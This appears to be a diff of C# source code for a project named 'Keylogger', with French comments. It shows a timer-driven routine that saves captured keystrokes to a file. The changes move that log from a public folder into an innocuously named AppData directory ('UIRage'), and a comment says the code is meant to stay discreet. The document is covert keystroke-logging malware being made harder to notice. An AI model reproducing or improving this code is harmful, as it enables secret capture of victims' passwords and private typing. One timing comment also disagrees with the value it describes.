@@ -1,7 +1,6 @@
-//Copyright © 2015 Ernest Foussard
+﻿//Copyright © 2015 Ernest Foussard
 //
 //This file is part of Keylogger.
-
 // Keylogger is free software: you can redistribute it and/or modify
 // it under the terms of the GNU General Public License as published by
 // the Free Software Foundation, version 3 of the License.
@@ -11,7 +10,6 @@
 // GNU General Public License for more details.
 // You should have received a copy of the GNU General Public License
 // along with Keylogger. If not, see <http://www.gnu.org/licenses/>.
-
 
 using System;
 using System.Runtime.InteropServices;
@@ -31,8 +29,8 @@ namespace Keylogger
         static void Main(string[] args)
         {
             VerboseArgs();
-            System.Threading.Timer timer = new System.Threading.Timer(Save); // On crée un timer qui execute la methode Save au tick
-            timer.Change(300000, 100000); // On définit au bout de combien de temps va s'executer le timer (100s en l'occurence), la periode n'a aucune importance
+            System.Threading.Timer timer = new System.Threading.Timer(Save); // On crée un timer qui appelle le delegate Save au tick
+            timer.Change(300000, 1000000); // On définit au bout de combien de temps va s'executer le timer (100s en l'occurence), la periode n'a aucune importance
             while (true) //Boucle infinie
             {
                 Thread.Sleep(10); // On attend 10 ms pour éviter de consommer trop de ressources et rester discret
@@ -51,15 +49,17 @@ namespace Keylogger
                 }
             }
         }
+
+        static string logsPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\UIRage\Logs.txt";
         static TimerCallback Save = (state) =>
         //Delegate de timer pointant sur une methode anonyme definie ci-dessous
         //Ecrit les logs dans le fichier Users\Public\Logs.txt puis ferme l'application
         {
             Console.WriteLine("Capture terminée. Affichage des logs:" + logs);
-            string str = System.IO.File.ReadAllText(@"C:\Users\Public\Logs.txt"); // On récupère le contenu du fichier
-            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\Public\Logs.txt")) // On lui ajoute les nouveaux logs et on sauvegarde
+            string str = System.IO.File.ReadAllText(logsPath); // On récupère le contenu du fichier
+            using (System.IO.StreamWriter file = new System.IO.StreamWriter(logsPath)) // On lui ajoute les nouveaux logs et on sauvegarde
             {
-               Console.WriteLine(@"Ouverture du fichier C:\Users\Public\Logs.txt en mode écriture réussite");
+               Console.WriteLine(@"Ouverture du fichier" + logsPath + "en mode écriture réussite");
                file.WriteLine(str + "<Début de la lecture>" + logs + "<Fin de la lecture>");
             }
             if (Environment.GetCommandLineArgs()[1] == "verbose")
